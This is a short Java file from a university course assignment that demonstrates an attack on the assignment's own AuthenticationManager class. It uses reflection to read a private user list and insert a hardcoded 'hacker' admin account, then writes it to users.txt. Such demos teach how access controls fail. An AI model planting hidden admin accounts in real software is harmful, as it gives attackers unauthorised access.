/* Author:     Nicholas Guerra
 * Instructor: Dr. H. Samadian
 * Course:     SE518
 * Term:       Fall 2024
 */

import java.lang.reflect.Field;
import java.util.List;

public class AuthenticationAttack {
    public static void main(String[] args) {
        try {
            // Bypass private access to the private static 'users' field in AuthenticationManager
            Field usersField = AuthenticationManager.class.getDeclaredField("users");
            usersField.setAccessible(true);

            // Get the current list of users
            List<User> users = (List<User>) usersField.get(null);

            // Add a hacker user directly to the list
            String hackerUsername = "hacker";
            String hackerPassword = "hack123";
            String hackerRole = "admin";
            users.add(new User(hackerUsername, AuthenticationManager.hashPassword(hackerPassword), hackerRole));

            // Save the updated list back to the file
            AuthenticationManager.saveUsers(users);

            System.out.println("Attack executed. Hacker user added to users.txt.");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
